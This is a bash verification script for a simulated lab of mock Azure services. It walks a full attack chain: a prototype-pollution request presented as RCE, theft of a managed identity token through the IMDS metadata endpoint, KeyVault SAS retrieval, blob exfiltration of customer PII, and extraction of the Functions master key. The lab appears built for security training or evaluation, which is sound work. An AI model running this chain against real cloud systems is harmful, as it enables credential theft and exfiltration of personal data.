#!/bin/bash
# verify_attack_chain.sh - Verify react2shell attack chain on SABER compose stack
#
# Runs verification from inside the sentinel container (which has network access to all services)
#
# Usage:
#   ./verify_attack_chain.sh                    # Use default EPISODE_ID=test001
#   EPISODE_ID=mytest ./verify_attack_chain.sh  # Use custom episode ID
#   ./verify_attack_chain.sh -v                 # Verbose output

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

EPISODE_ID="${EPISODE_ID:-test001}"
SENTINEL_CONTAINER="react2shell-sentinel-${EPISODE_ID}"
VERBOSE=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose) VERBOSE=true; shift ;;
        -h|--help)
            echo "Usage: EPISODE_ID=xxx $0 [-v]"
            echo "  -v  Verbose output"
            exit 0
            ;;
        *) shift ;;
    esac
done

PASSED=0
FAILED=0

pass() { echo -e "  ${GREEN}✓${NC} $1"; PASSED=$((PASSED + 1)); }
fail() { echo -e "  ${RED}✗${NC} $1"; FAILED=$((FAILED + 1)); }
info() { echo -e "  ${BLUE}→${NC} $1"; }

# Run python inside sentinel container
run_in_sentinel() {
    docker exec "$SENTINEL_CONTAINER" python -c "$1" 2>/dev/null
}

echo "============================================================"
echo "SABER React2Shell Attack Chain Verification"
echo "Episode: $EPISODE_ID"
echo "============================================================"
echo ""

# =============================================================================
# Check containers are running
# =============================================================================
echo -e "${BLUE}[1/5] Container Status${NC}"

CONTAINERS=(
    "react2shell-sentinel-${EPISODE_ID}"
    "react2shell-app-service-${EPISODE_ID}"
    "react2shell-imds-${EPISODE_ID}"
    "react2shell-keyvault-${EPISODE_ID}"
    "react2shell-azurite-${EPISODE_ID}"
    "react2shell-arm-api-${EPISODE_ID}"
    "react2shell-functions-${EPISODE_ID}"
    "react2shell-front-door-${EPISODE_ID}"
    "react2shell-azure-ad-${EPISODE_ID}"
    "react2shell-kusto-${EPISODE_ID}"
)

for container in "${CONTAINERS[@]}"; do
    if docker ps --format '{{.Names}}' | grep -q "^${container}$"; then
        STATUS=$(docker inspect --format='{{.State.Health.Status}}' "$container" 2>/dev/null || echo "no-healthcheck")
        if [[ "$STATUS" == "healthy" ]] || [[ "$STATUS" == "no-healthcheck" ]]; then
            pass "$container ($STATUS)"
        else
            fail "$container ($STATUS)"
        fi
    else
        fail "$container (not running)"
    fi
done
echo ""

# =============================================================================
# Health Checks
# =============================================================================
echo -e "${BLUE}[2/5] Service Health Checks${NC}"

HEALTH_RESULT=$(run_in_sentinel "
import urllib.request, json, ssl

ctx = ssl._create_unverified_context()
services = {
    'App Service': 'http://react2shell-app-service:8080/health',
    'IMDS': 'http://react2shell-imds:80/health',
    'Front Door': 'http://react2shell-front-door:8080/health',
    'Azure AD': 'http://react2shell-azure-ad:8080/health',
    'Functions': 'http://react2shell-functions:7071/health',
    'Sentinel': 'http://localhost:5000/health',
}

for name, url in services.items():
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        data = json.loads(resp.read())
        print(f'OK|{name}|{data.get(\"status\", \"up\")}')
    except Exception as e:
        print(f'FAIL|{name}|{str(e)[:50]}')
")

while IFS='|' read -r status name detail; do
    if [[ "$status" == "OK" ]]; then
        pass "$name: $detail"
    else
        fail "$name: $detail"
    fi
done <<< "$HEALTH_RESULT"
echo ""

# =============================================================================
# Phase 1: Initial Access - React Server Components RCE
# =============================================================================
echo -e "${BLUE}[3/5] Phase 1: Initial Access (CVE-2025-55182 RCE)${NC}"

PHASE1_RESULT=$(run_in_sentinel "
import urllib.request, json

# Recon: robots.txt
try:
    resp = urllib.request.urlopen('http://react2shell-app-service:8080/robots.txt', timeout=5)
    content = resp.read().decode()
    if '/_next/rsc' in content:
        print('OK|robots.txt reveals /_next/rsc')
    else:
        print('FAIL|robots.txt missing rsc path')
except Exception as e:
    print(f'FAIL|robots.txt: {e}')

# Exploit RSC
try:
    req = urllib.request.Request(
        'http://react2shell-app-service:8080/_next/rsc',
        data=json.dumps({'__proto__': {'polluted': True}}).encode(),
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    resp = urllib.request.urlopen(req, timeout=5)
    data = json.loads(resp.read())
    if data.get('exploited'):
        print('OK|RCE achieved - prototype pollution')
        if 'capabilities' in data and 'imds_proxy' in data.get('capabilities', {}):
            print('OK|/exec endpoint discovered')
        if 'env' in data:
            print('OK|Environment variables leaked')
    else:
        print('FAIL|RCE not achieved')
except Exception as e:
    print(f'FAIL|RSC exploit: {e}')
")

while IFS='|' read -r status msg; do
    [[ -z "$status" ]] && continue
    if [[ "$status" == "OK" ]]; then
        pass "$msg"
    else
        fail "$msg"
    fi
done <<< "$PHASE1_RESULT"
echo ""

# =============================================================================
# Phase 2: Credential Access - IMDS Token Theft
# =============================================================================
echo -e "${BLUE}[4/5] Phase 2: Credential Theft (IMDS Token)${NC}"

TOKEN=$(run_in_sentinel "
import urllib.request, json

try:
    req = urllib.request.Request(
        'http://react2shell-app-service:8080/exec',
        data=json.dumps({
            'path': '/metadata/identity/oauth2/token',
            'params': {
                'api-version': '2018-02-01',
                'resource': 'https://management.azure.com/'
            }
        }).encode(),
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    resp = urllib.request.urlopen(req, timeout=10)
    data = json.loads(resp.read())
    if 'access_token' in data:
        print('TOKEN:' + data['access_token'])
        print('OK|Managed Identity token stolen')
        print('OK|Token type: ' + data.get('token_type', 'unknown'))
    else:
        print('FAIL|No access_token in response')
except Exception as e:
    print(f'FAIL|IMDS theft: {e}')
")

BEARER_TOKEN=""
while IFS='|' read -r status msg; do
    [[ -z "$status" ]] && continue
    if [[ "$status" == "TOKEN:"* ]]; then
        BEARER_TOKEN="${status#TOKEN:}"
    elif [[ "$status" == "OK" ]]; then
        pass "$msg"
    else
        fail "$msg"
    fi
done <<< "$TOKEN"

[[ "$VERBOSE" == "true" ]] && [[ -n "$BEARER_TOKEN" ]] && echo "      Token: ${BEARER_TOKEN:0:50}..."
echo ""

# =============================================================================
# Phase 3-4: Lateral Movement & Exfiltration
# =============================================================================
echo -e "${BLUE}[5/5] Phase 3-4: Lateral Movement & Exfiltration${NC}"

if [[ -z "$BEARER_TOKEN" ]]; then
    fail "Skipping - no token from Phase 2"
else
    PHASE34_RESULT=$(run_in_sentinel "
import urllib.request, json, ssl

token = '''$BEARER_TOKEN'''
ctx = ssl._create_unverified_context()

# KeyVault: Get SAS token
sas_token = None
try:
    req = urllib.request.Request(
        'https://react2shell-keyvault:443/secrets/storage-sas-token?api-version=7.4',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    if 'value' in data:
        sas_token = data['value']
        print('OK|KeyVault: SAS token retrieved')
    else:
        print('FAIL|KeyVault: No value in response')
except Exception as e:
    print(f'FAIL|KeyVault: {e}')

# Blob Storage: Exfiltrate data
if sas_token:
    try:
        url = f'http://react2shell-azurite:10000/proddata001/sensitive-data/customer-data.json?{sas_token}'
        resp = urllib.request.urlopen(url, timeout=10)
        data = json.loads(resp.read())
        if 'ssn' in str(data) or 'email' in str(data):
            print('OK|Blob: PII data exfiltrated')
        else:
            print('FAIL|Blob: No PII in response')
    except Exception as e:
        print(f'FAIL|Blob: {e}')
else:
    print('FAIL|Blob: Skipped - no SAS token')

# ARM API: Enumeration
try:
    req = urllib.request.Request(
        'https://react2shell-arm-api:443/subscriptions?api-version=2022-12-01',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    if 'value' in data:
        print('OK|ARM: Subscriptions enumerated')
    else:
        print('FAIL|ARM: No subscriptions')
except Exception as e:
    print(f'FAIL|ARM: {e}')

# Functions: Credential extraction
try:
    req = urllib.request.Request(
        'http://react2shell-functions:7071/admin/host/keys',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, timeout=10)
    data = json.loads(resp.read())
    if 'masterKey' in data:
        print('OK|Functions: Master key retrieved')
    else:
        print('FAIL|Functions: No master key')
except Exception as e:
    print(f'FAIL|Functions: {e}')

# Sentinel: Log count
try:
    resp = urllib.request.urlopen('http://localhost:5000/health', timeout=5)
    data = json.loads(resp.read())
    log_count = data.get('logCount', 0)
    print(f'OK|Sentinel: {log_count} attack logs captured')
except Exception as e:
    print(f'FAIL|Sentinel: {e}')
")

    while IFS='|' read -r status msg; do
        [[ -z "$status" ]] && continue
        if [[ "$status" == "OK" ]]; then
            pass "$msg"
        else
            fail "$msg"
        fi
    done <<< "$PHASE34_RESULT"
fi
echo ""

# =============================================================================
# Summary
# =============================================================================
echo "============================================================"
TOTAL=$((PASSED + FAILED))
if [[ $FAILED -eq 0 ]]; then
    echo -e "${GREEN}All $PASSED checks passed!${NC}"
    echo "============================================================"
    echo ""
    echo "Attack chain verified:"
    echo "  1. Initial Access    → RCE via CVE-2025-55182 /_next/rsc"
    echo "  2. Credential Access → IMDS Managed Identity token theft"
    echo "  3. Privilege Esc     → KeyVault SAS token retrieval"
    echo "  4. Exfiltration      → Blob storage PII extraction"
    echo "  5. Lateral Movement  → ARM API + Functions enumeration"
    echo "  6. Detection         → Sentinel SIEM log capture"
    echo ""
    exit 0
else
    echo -e "${YELLOW}$PASSED passed, ${RED}$FAILED failed${NC} (of $TOTAL)"
    echo "============================================================"
    exit 1
fi
